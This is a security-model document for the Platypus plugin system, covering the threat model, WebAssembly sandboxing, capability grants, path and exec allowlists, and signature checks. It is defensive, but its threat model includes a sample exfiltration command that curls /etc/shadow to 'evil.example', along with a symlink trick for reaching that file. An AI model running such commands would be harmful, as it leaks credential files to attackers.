# Plugin security model

Mental model + concrete enforcement points for every layer of the
Platypus plugin system. Read [AUTHORS.md](AUTHORS.md) and
[USERS.md](USERS.md) first for the development + operator
perspectives; this document is the security-architect view.

## Threat model

The system is designed against three classes of adversary:

1. **Malicious plugin author.** They publish a plugin claiming
   benign capabilities ("just monitors disk!") that secretly tries to
   `exec /bin/curl http://evil.example/$(cat /etc/shadow)`. Defended
   by capability declaration + operator-confirmed grant + WebAssembly
   sandbox (no syscalls).

2. **Tampering in transit / at rest.** The .wasm bytes get modified
   between the author's signing machine and the agent's wasm
   runtime — by a compromised mirror, a man-in-the-middle on the
   marketplace fetch, or local tampering on the agent host. Defended
   by minisign Ed25519 detached signatures, verified at install **and
   on every load** (cold-start of an extism instance).

3. **Lateral movement after compromise.** An adversary who
   compromised one plugin tries to use that foothold to attack the
   host, the agent's own state, or another plugin's state. Defended
   by linear-memory isolation (each plugin gets its own wazero
   runtime), per-plugin state directories with mode 0700, and
   per-plugin capability allowlists (one breached plugin doesn't
   widen another's surface).

What the system does **not** defend against:

- A compromised agent host (root on the box bypasses all
  user-space sandboxing).
- A compromised system signing key (forged "system" plugins would be
  auto-installed by every agent that trusts the key — rotate via
  agent rebuild).
- Side-channel timing leaks across plugins sharing a CPU.

## Sandbox: WebAssembly + wazero

Every plugin instance is a fresh wazero runtime with:

- **Linear memory only.** No syscalls, no FFI to the agent's Go code
  except through the host functions we explicitly register.
- **Per-call deadline** via `context.WithTimeout` derived from
  `manifest.resources.max_invocation_ms`. wazero's
  `WithCloseOnContextDone(true)` guarantees the runtime actually
  stops when the deadline fires (not just the goroutine that called
  it).
- **Memory cap** via `wazero.RuntimeConfig.WithMemoryLimitPages` set
  from `manifest.resources.max_memory_mb`. A plugin asking for more
  than 1 GiB is rejected at manifest-validation time.
- **No ambient WASI mounts.** EnableWasi=true gives plugins extism's
  WASI stdlib (printf, malloc), but `AllowedPaths` /
  `AllowedHosts` are deliberately empty — every IO must flow through
  one of our host functions.

## Capability model

Capabilities are a small, fixed set defined in
`internal/agent/plugin/manifest.go`:

```
log     kv     sysinfo     exec     fs.read     net.http
```

Plugins **cannot invent new capabilities**. Adding a new one means
shipping a new agent build with the matching host function +
enforcement code.

Capability lifecycle:

1. **Declared.** The manifest lists each capability the plugin needs,
   with per-cap parameters (`exec.commands`, `fs.read.paths`,
   `net.http.hosts`).
2. **Granted.** At install time the operator confirms a subset (via
   the desktop UI dialog or the REST endpoint's
   `granted_capabilities`). The granted set is the **enforced** set;
   the manifest's request is just an upper bound.
3. **Enforced.** Every host function checks the granted set on every
   call. Calls outside the set return `capability_denied`. Calls
   inside the set still respect the per-cap parameters (you can
   read `/etc/nginx` if the path allowlist mentions it; you can't
   read `/etc/shadow` even with `fs.read` granted, unless the
   manifest's `fs.read.paths` lists it AND the operator confirmed).

Defense in depth, three layers:

```
operator confirmation ⊂ manifest declaration ⊂ allCapabilities
```

A plugin update that widens its declaration above what the operator
previously granted triggers a fresh confirmation dialog (the existing
grant is preserved, the new capabilities are presented as an opt-in).

## Path allowlist semantics (`fs.read`)

`capabilities.fs.read.paths` is a list of absolute paths. A read of
path P is allowed iff:

- After `filepath.Clean(P)` and **eager `filepath.EvalSymlinks`**,
  the resolved path equals or descends from one of the allowed
  entries (also resolved through symlinks).
- The check is **component-aware**: `/etc/nginx2` is NOT under
  `/etc/nginx`.
- The plugin can pass either the symlink path or the resolved path —
  same allowlist check applies.

Symlink follow-through is the subtle one. A plugin manifest with
`fs.read.paths: [/etc/nginx]` and an operator-installed
`/etc/nginx/leak -> /etc/shadow` symlink does **NOT** grant access
to /etc/shadow: the resolved path falls outside the allowlist and is
rejected. Tested in `host_fs_test.go`.

## Command allowlist semantics (`exec`)

`capabilities.exec.commands` is a list of absolute paths to executable
files. Exact match required — wildcards, prefixes, basename matching
are NOT supported by design. A plugin asking to run `/usr/sbin/nginx`
gets exactly that binary; if the operator wants the plugin to run
`/usr/local/sbin/nginx` they must add a separate entry.

Arguments and environment variables are passed through as-is. The
agent does not sanitize them: a plugin allowed to run
`/usr/bin/awk` can run any awk script, which is full code execution.
The reason exec is an opt-in capability is precisely that fact.

## Signature verification

We use **minisign** Ed25519 (the same algorithm
[minisign(1)](https://jedisct1.github.io/minisign/) writes). One
publisher key per author; .minisig files are detached signatures
sitting next to the .wasm.

Verification happens twice in the lifecycle:

1. **At install**, before any extract or load. Defends against the
   server / wire / inline upload tampering with bytes between the
   operator's session and disk.
2. **At every load**, including agent reboot. Defends against post-
   install tampering on the host's filesystem.

Failure at install → agent emits `signature_mismatch`, leaves
nothing behind on disk. Failure at re-load → the plugin is moved to
`<plugin_root>/quarantine/<plugin_id>/` and an event is emitted to
the server (forensics signal).

The signature is over the **wasm bytes only**, not the manifest. The
manifest is verified separately by the agent's parser (id +
version + cap shape). This split lets a publisher correct a
typo in the manifest's `description:` field without re-signing the
.wasm — they republish only the .yaml.

## System plugin trust

System plugins (the bundled ones in
`internal/agent/plugin/system/embedded/`) are signed by a single
**system signing key** that ships inside the agent binary at build
time (`embedded/publisher.pub`). The matching secret lives outside
the repo with the release pipeline; only Platypus maintainers can
produce new system-plugin bundles.

System plugins:

- Are auto-installed on every agent boot (`EnsureInstalled`). 
- Are granted **every capability they declare** (no operator
  prompt — the operator implicitly trusts them by trusting the
  agent build).
- Refuse to uninstall via REST (`ErrPluginIsSystem`); the bundled
  bootstrap would reinstall them on next boot anyway.

Rotation: bumping the system signing key is a coordinated event —
the new key replaces `embedded/publisher.pub` in the agent source
tree, every system plugin is re-signed with the new key, and the
agent is rebuilt + redeployed. Agents on the old build keep working
with the old key until they upgrade.

## Resource accounting

Every Invoke records into the agent's structured log:

- `plugin_id`, `method`, `correlation_id`
- `granted_capabilities` (the set the call actually ran under)
- `fuel_used`, `mem_peak_bytes`, `elapsed_ms`
- `error` (empty on success, `capability_denied: …` etc. otherwise)

The server's activity log mirrors install / uninstall / enable
events. Together these give a complete forensic record: which
operator installed which plugin signed by which key, what the plugin
was granted to do, every time it was called, and how much it
consumed each call.

## What an attacker has to do

To get a malicious plugin running on an agent, an attacker must
either:

1. **Compromise a publisher key** the agent already trusts. Deploy
   a forged plugin signed by that key. Mitigation: rotate the
   publisher key (operator removes the old `.pub` from
   `publishers/`, distributes a new one). The forged plugin keeps
   running until next reboot; revocation is a Phase 2 feature.

2. **Compromise the agent host** with root. Bypass everything. The
   plugin sandbox doesn't matter at this point.

3. **Persuade an operator to install + grant `exec` + add the right
   command to the allowlist**. This is plain social engineering and
   not something the technical sandbox addresses; the goal is to
   make capability grants prominently visible in the install dialog
   so an operator notices an unjustified `exec` request.

The system does NOT defend against:

- An author publishing a malicious plugin without elevated
  capabilities. The plugin runs in a 32 MB sandbox with no IO; worst
  case it returns wrong data on the methods it exports. Detection is
  reputational, not technical.

## Auditing checklist

Before granting a third-party plugin capabilities on a production
agent:

- [ ] Verified the publisher key out-of-band (source: who? signing
      ceremony: when?).
- [ ] Read the manifest's `capabilities` block. Could the requested
      grants do harm if the plugin were malicious?
- [ ] Read the manifest's `homepage` + author. Reputable?
- [ ] Confirmed the .wasm sha256 matches whatever the publisher
      announced (if marketplace, the index repo records this).
- [ ] Granted the **minimum** capability subset that lets the plugin
      function. Widen later only on demonstrated need.
- [ ] Set up alerting on `plugin.invoke` log lines with non-empty
      `error` field — a plugin that's being told `capability_denied`
      a lot is either misconfigured or trying to do things it
      shouldn't.

## See also

- [AUTHORS.md](AUTHORS.md) — building plugins
- [USERS.md](USERS.md) — installing + managing plugins
- `internal/agent/plugin/host_*.go` — the actual enforcement code
